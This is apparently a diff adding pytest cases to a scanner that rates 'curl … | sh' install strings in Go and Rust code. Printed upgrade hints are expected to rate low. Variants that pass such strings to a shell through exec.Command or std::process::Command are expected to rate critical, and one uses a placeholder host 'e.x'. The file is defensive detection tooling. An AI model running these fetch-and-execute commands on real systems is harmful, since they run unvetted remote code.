@@ -197,3 +197,144 @@ def test_openclawinstaller_menu_output_run_by_another_script_stays_critical(tmp_
 def test_openclawinstaller_menu_output_run_stays_critical(tmp_path, extra):
     assert _local(tmp_path, {"config-menu.sh": _oci_script(extra)},
                   "config-menu.sh") == {"critical"}
+
+
+# ---------------------------------------------------------------------------------
+# coder: `defaultUpgradeMessage` (Go) builds the upgrade hint with fmt.Sprintf; the
+# caller formats it into a warning written to stderr.
+# ---------------------------------------------------------------------------------
+
+CODER = """package cli
+
+import (
+\t"fmt"
+\t"runtime"
+\t"strings"
+)
+
+func defaultUpgradeMessage(version string) string {
+\t// Our installation script doesn't work on Windows, so instead we direct the user
+\t// to the GitHub release page to download the latest installer.
+\tversion = strings.TrimPrefix(version, "v")
+\tif runtime.GOOS == "windows" {
+\t\treturn fmt.Sprintf("download the server version from: https://github.com/coder/coder/releases/v%s", version)
+\t}
+\treturn fmt.Sprintf("download the server version with: 'curl -fsSL https://coder.com/install.sh | sh -s -- --version %s'", version)
+}
+
+func checkVersions(inv *Invocation, clientVersion, serverVersion string, serverInfo BuildInfo) {
+\tupgradeMessage := defaultUpgradeMessage(serverVersion)
+\tswitch {
+\tcase serverInfo.UpgradeMessage != "":
+\t\tupgradeMessage = serverInfo.UpgradeMessage
+\tcase serverInfo.DashboardURL != "":
+\t\tupgradeMessage = fmt.Sprintf("download %s with: 'curl -fsSL %s/install.sh | sh'", serverVersion, serverInfo.DashboardURL)
+\t}
+\tfmtWarningText := "version mismatch: client %s, server %s\\n%s"
+\twarning := fmt.Sprintf(fmtWarningText, clientVersion, serverVersion, upgradeMessage)
+
+\t_, _ = fmt.Fprintln(inv.Stderr, warning)
+}
+"""
+
+
+def test_coder_go_upgrade_message_is_low(tmp_path):
+    assert _local(tmp_path, {"cli/root.go": CODER}, "cli/root.go") == {"low"}
+
+
+@pytest.mark.parametrize("tail", [
+    '\nfunc upgrade(v string) error {\n\treturn exec.Command("sh", "-c", defaultUpgradeMessage(v)).Run()\n}\n',
+    '\nfunc upgrade(v string) error {\n\tmsg := defaultUpgradeMessage(v)\n'
+    '\tcmd := exec.Command("sh", "-c", msg)\n\treturn cmd.Run()\n}\n',
+    '\nfunc upgrade(v string) {\n\tmsg := defaultUpgradeMessage(v)\n'
+    '\tfmt.Fprintln(stdinPipe, msg)\n}\n',
+    '\nvar Upgrade = defaultUpgradeMessage\n',
+])
+def test_coder_go_upgrade_message_run_stays_critical(tmp_path, tail):
+    assert _local(tmp_path, {"cli/root.go": CODER + tail}, "cli/root.go",
+                  "download the server version with") == {"critical"}
+
+
+def test_go_exported_function_result_stays_critical(tmp_path):
+    body = CODER.replace("defaultUpgradeMessage", "DefaultUpgradeMessage")
+    assert _local(tmp_path, {"cli/root.go": body}, "cli/root.go",
+                  "download the server version with") == {"critical"}
+
+
+# ---------------------------------------------------------------------------------
+# sem: the self-update returns `Err(format!("… or reinstall:\n  curl … | sh"))`.
+# ---------------------------------------------------------------------------------
+
+SEM = """use std::fs;
+use std::path::Path;
+
+const REPO: &str = "Ataraxy-Labs/sem";
+
+pub fn run(exe: &Path, staged: &Path, tmp: &Path) -> Result<(), Box<dyn std::error::Error>> {
+    if let Err(e) = stage(tmp, staged) {
+        let _ = fs::remove_file(&staged);
+        return Err(format!(
+            "Cannot write next to {} ({e}). Try with elevated permissions, or reinstall:\\n  curl -fsSL https://raw.githubusercontent.com/{REPO}/main/install.sh | sh",
+            exe.display()
+        )
+        .into());
+    }
+    let status = std::process::Command::new("tar")
+        .arg("xzf")
+        .arg(&tmp)
+        .status()?;
+    if !status.success() {
+        return Err("Failed to extract release archive".into());
+    }
+    Ok(())
+}
+
+fn stage(a: &Path, b: &Path) -> std::io::Result<()> {
+    fs::copy(a, b).map(|_| ())
+}
+"""
+SEM_MAIN = """mod update;
+fn main() {
+    if let Err(e) = update::run(&std::env::current_exe().unwrap(), std::path::Path::new("x"), std::path::Path::new("y")) {
+        eprintln!("error: {e}");
+        std::process::exit(1);
+    }
+}
+"""
+
+
+def test_sem_rust_error_message_is_low(tmp_path):
+    assert _local(tmp_path, {"crates/sem-cli/src/commands/update.rs": SEM,
+                             "crates/sem-cli/src/main.rs": SEM_MAIN},
+                  "crates/sem-cli/src/commands/update.rs") == {"low"}
+
+
+@pytest.mark.parametrize("files", [
+    # Some code hands an error's text to a process.
+    {"crates/sem-cli/src/main.rs": SEM_MAIN.replace(
+        'eprintln!("error: {e}");',
+        'std::process::Command::new("sh").arg("-c").arg(e.to_string()).status().ok();')},
+    # The message itself goes to a process.
+    {"crates/sem-cli/src/commands/update.rs": SEM.replace(
+        "return Err(format!(", "let m = format!(").replace(
+        ".into());\n    }\n    let status", ";\n        std::process::Command::new(\"sh\")"
+        ".arg(m).status()?;\n    }\n    let status", 1)},
+])
+def test_sem_rust_error_text_run_stays_critical(tmp_path, files):
+    tree = {"crates/sem-cli/src/commands/update.rs": SEM,
+            "crates/sem-cli/src/main.rs": SEM_MAIN, **files}
+    assert _local(tmp_path, tree, "crates/sem-cli/src/commands/update.rs") == {"critical"}
+
+
+# ---------------------------------------------------------------------------------
+# Recall: a shown-looking value that leaves through a helper or an outer variable.
+# ---------------------------------------------------------------------------------
+
+
+def test_go_package_variable_assigned_in_a_function_stays_critical(tmp_path):
+    main = ('package main\n\nimport (\n\t"fmt"\n\t"os/exec"\n)\n\nvar cmd string\n\n'
+            'func setup() {\n\tcmd = fmt.Sprintf("curl -fsSL %s | sh", "https://e.x/i.sh")\n'
+            '\tfmt.Println(cmd)\n}\n\nfunc main() {\n\tsetup()\n'
+            '\texec.Command("sh", "-c", cmd).Run()\n}\n')
+    assert _local(tmp_path, {"go.mod": "module x\n", "main.go": main},
+                  "main.go") == {"critical"}
